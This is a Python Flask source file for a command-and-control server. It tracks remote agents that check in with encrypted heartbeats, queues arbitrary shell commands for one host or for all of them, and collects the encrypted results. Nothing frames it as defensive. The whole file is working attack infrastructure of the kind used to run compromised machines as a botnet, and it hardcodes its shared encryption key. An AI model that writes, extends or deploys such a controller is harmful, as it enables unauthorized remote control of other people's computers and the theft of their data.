from flask import Flask, request, render_template, jsonify, redirect, url_for
from cryptography.fernet import Fernet
import time
import json

app = Flask(__name__)

# Your shared key
SECRET_KEY = b'7lJcf_dNt7Jhc87wCBcYO46b4XRy18upQmOKrij3B4k=' 
cipher = Fernet(SECRET_KEY)

# --- THE "BRAINS" OF THE OPERATION ---
# agents stores: { 'hostname': {'os': '...', 'last_seen': '...', 'last_result': '...'} }
agents = {}
# command_queue stores: { 'hostname': 'next_command_to_run' }
command_queue = {}

@app.route('/')
def dashboard():
    """Renders the HTML Front-End"""
    return render_template('index.html', agents=agents)

@app.route('/checkin', methods=['POST'])
def checkin():
    try:
        # 1. Receive and Decrypt Heartbeat
        encrypted_data = request.data
        decrypted_raw = cipher.decrypt(encrypted_data).decode()
        
        # Assume agent sends a JSON string: {"hostname": "WIN-SRV", "os": "Windows 2022"}
        data = json.loads(decrypted_raw)
        host = data.get('hostname', 'unknown')

        # 2. Update the "Database"
        agents[host] = {
            'os': data.get('os', 'Unknown'),
            'last_seen': time.strftime('%H:%M:%S'),
            'ip': request.remote_addr,
            'last_result': agents.get(host, {}).get('last_result', 'No output yet')
        }

        # 3. Fetch pending command for THIS specific agent
        cmd = command_queue.pop(host, "none")
        
        # 4. Encrypt and Send back
        encrypted_command = cipher.encrypt(cmd.encode())
        return encrypted_command
    except Exception as e:
        print(f"[!] Checkin Error: {e}")
        return "Error", 400

@app.route('/result', methods=['POST'])
def get_result():
    try:
        encrypted_output = request.data
        decrypted_output = cipher.decrypt(encrypted_output).decode()

        # Extract hostname and result (assuming agent sends: "HOSTNAME|RESULT")
        # If your agent just sends the result, you might need to find which agent checked in last
        print(f"\n[*] Result received: {decrypted_output}")
        
        # For simplicity, we'll log it to console. 
        # To show it on the web UI, you'd save it to the 'agents' dict.
        return "OK", 200
    except Exception as e:
        print(f"[!] Result Error: {e}")
        return "Error", 400

@app.route('/admin/send_cmd', methods=['POST'])
def send_command():
    """Handles data from the Dashboard form"""
    target = request.form.get('target')
    cmd = request.form.get('command')
    
    if target == "ALL":
        for host in agents:
            command_queue[host] = cmd
    else:
        command_queue[target] = cmd
        
    print(f"[*] Command '{cmd}' queued for {target}")
    return redirect(url_for('dashboard'))

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5000)